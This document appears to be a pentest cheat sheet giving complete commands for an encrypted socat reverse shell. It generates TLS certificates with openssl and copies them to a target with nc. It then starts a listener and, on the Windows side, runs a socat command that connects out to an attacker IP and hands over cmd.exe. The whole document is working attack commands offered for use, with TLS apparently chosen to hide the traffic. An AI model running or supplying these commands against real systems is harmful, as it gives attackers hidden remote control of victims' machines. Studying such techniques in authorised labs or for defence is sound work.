# 0) Generate TLS cert for encrypted comms
```sh
# Generate self-signed keypair for server
# DO NOT FORGET A COMMON NAME (such as: socatssl)
openssl req \
-newkey rsa:2048 \
-nodes \
-keyout rev_shell.key \
-x509 \
-days 362 \
-out rev_shell.crt

# concat files for use with socat
cat rev_shell.key rev_shell.crt > rev_shell.pem

# Generate self-signed keypair for client
openssl req \
-newkey rsa:2048 \
-nodes \
-keyout client.key \
-x509 \
-days 362 \
-out client.crt

# concat files for use with socat
cat client.key client.crt > client.pem
```

# 1) Copy files to remote
```sh
# Send cacert
nc -nvlp 8080 > rev_shell.crt               # windows
nc -nv 192.168.202.10 8080 < rev_shell.crt  # nix

# Send client key/cert
nc -nvlp 8080 > client.pem                  # windows
nc -nv 192.168.202.10 8080 < client.pem     # nix
```

# 2) spawn listener for remote shell
```sh
export LPORT=443
socat -d -d OPENSSL-LISTEN:$LPORT,cert=rev_shell.pem,verify=0 STDOUT
```

# 3) send cmd to remote attacker
```bat
# Send encrypted cmd back to attacker
set RHOST=192.168.119.202
set RPORT=443
set CN=socatssl
set f_client=client.pem
set f_server=rev_shell.crt
socat openssl-connect:%RHOST%:%RPORT%,openssl-commonname=%CN%,cert=%f_client%,cafile=%f_server% EXEC:cmd.exe,pipes
```
